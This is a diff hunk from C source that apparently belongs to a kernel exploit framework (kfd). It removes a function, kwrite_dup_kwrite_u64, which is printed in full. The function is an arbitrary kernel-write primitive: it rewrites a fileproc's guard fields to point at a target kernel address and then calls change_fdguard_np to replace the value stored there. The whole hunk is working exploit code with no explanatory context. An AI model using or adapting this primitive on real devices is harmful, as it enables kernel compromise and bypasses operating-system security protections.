@@ -66,56 +66,6 @@ bool kwrite_sem_open_search(struct kfd* kfd, uint64_t object_uaddr)
     return false;
 }
 
-void kwrite_dup_kwrite_u64(struct kfd* kfd, uint64_t kaddr, uint64_t new_value)
-{
-    if (new_value == 0) {
-        print_warning("cannot write 0");
-        return;
-    }
-
-    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
-    int32_t kwrite_fd = fds[kfd->kwrite.krkw_object_id];
-    uint64_t fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;
-
-    const bool allow_retry = false;
-
-    do {
-        uint64_t old_value = 0;
-        kread_kfd((uint64_t)(kfd), kaddr, &old_value, sizeof(old_value));
-
-        if (old_value == 0) {
-            print_warning("cannot overwrite 0");
-            return;
-        }
-
-        if (old_value == new_value) {
-            break;
-        }
-
-        uint16_t old_fp_guard_attrs = static_uget(fileproc, fp_guard_attrs, fileproc_uaddr);
-        uint16_t new_fp_guard_attrs = GUARD_REQUIRED;
-        static_uset(fileproc, fp_guard_attrs, fileproc_uaddr, new_fp_guard_attrs);
-
-        uint64_t old_fp_guard = static_uget(fileproc, fp_guard, fileproc_uaddr);
-        uint64_t new_fp_guard = kaddr - static_offsetof(fileproc_guard, fpg_guard);
-        static_uset(fileproc, fp_guard, fileproc_uaddr, new_fp_guard);
-
-        uint64_t guard = old_value;
-        uint32_t guardflags = GUARD_REQUIRED;
-        uint64_t nguard = new_value;
-        uint32_t nguardflags = GUARD_REQUIRED;
-
-        if (allow_retry) {
-            syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL);
-        } else {
-            assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
-        }
-
-        static_uset(fileproc, fp_guard_attrs, fileproc_uaddr, old_fp_guard_attrs);
-        static_uset(fileproc, fp_guard, fileproc_uaddr, old_fp_guard);
-    } while (allow_retry);
-}
-
 void kwrite_sem_open_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
 {
     volatile uint64_t* type_base = (volatile uint64_t*)(uaddr);
